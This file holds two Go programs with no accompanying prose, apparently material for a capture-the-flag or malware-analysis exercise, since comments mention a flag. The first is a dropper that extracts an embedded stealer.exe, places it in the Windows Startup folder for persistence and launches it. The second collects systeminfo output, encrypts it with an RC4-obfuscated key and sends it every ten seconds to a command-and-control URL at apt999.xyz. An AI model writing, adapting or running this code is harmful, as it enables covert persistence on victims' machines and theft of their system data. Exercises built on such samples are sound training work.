package main

import (
	"embed"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

//go:embed stealer.exe
var embeddedFiles embed.FS

func check() {
	// check installed execl2016
	excel_path := `C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE`
	if _, err := os.Stat(excel_path); os.IsNotExist(err) {
		os.Exit(1)
	}
}

func hidden() []byte {
	// embed stealer.exe into dropper.exe
	data, err := embeddedFiles.ReadFile("stealer.exe")
	if err != nil {
		return nil
	}
	return data
}

func drop(data []byte) string {
	// output stealer.exe to startup folder
	appdata := os.Getenv("APPDATA")
	startup := filepath.Join(appdata, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\stealer.exe")

	err := os.WriteFile(startup, data, 0755)
	if err != nil {
		return ""
	}
	return startup
}

func main() {
	check()

	data := hidden()

	path := drop(data)

	// exec stealer.exe
	time.Sleep(5 * time.Second)
	cmd := exec.Command(path)
	cmd.Start()
}





package main

import (
	"crypto/rc4"
	"encoding/base64"
	"io"
	"net/http"
	"net/url"
	"os/exec"
	"time"
)

var flag string

func encrypt() string {
	// exec systeminfo
	out, err := exec.Command("systeminfo").Output()
	if err != nil {
		return ""
	}
	result := out

	// decode key
	encoded_key := "k0XIjRJZDWQfXSGWesL4vQ=="
	decoded_key, err := base64.StdEncoding.DecodeString(encoded_key)
	if err != nil {
		return ""
	}
	// decrypt key
	rc4_key := []byte("rc4_key_is_tokyo")
	cipher1, err := rc4.NewCipher(rc4_key)
	if err != nil {
		return ""
	}
	key := make([]byte, len(decoded_key))
	cipher1.XORKeyStream(key, decoded_key)

	// encrypt result with decrypted key
	cipher2, err := rc4.NewCipher(key)
	if err != nil {
		return ""
	}
	ciphertext := make([]byte, len(result))
	cipher2.XORKeyStream(ciphertext, result)

	// encode encrypted result
	encoded := base64.StdEncoding.EncodeToString(ciphertext)

	// for flag
	flag = (string(key))

	return encoded
}

func httprequest(data string) {
	// set http request
	form := url.Values{}
	form.Add("TEST", data)
	url := "http://apt999.xyz/c2.php"
	client := &http.Client{
		Timeout: 1 * time.Second,
	}

	// send http request
	resp, err := client.PostForm(url, form)
	if err != nil {
		return
	}
	io.Copy(io.Discard, resp.Body)

}

func main() {
	data := encrypt()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		<-ticker.C

		httprequest(data)

		// for flag
		_ = flag
	}
}
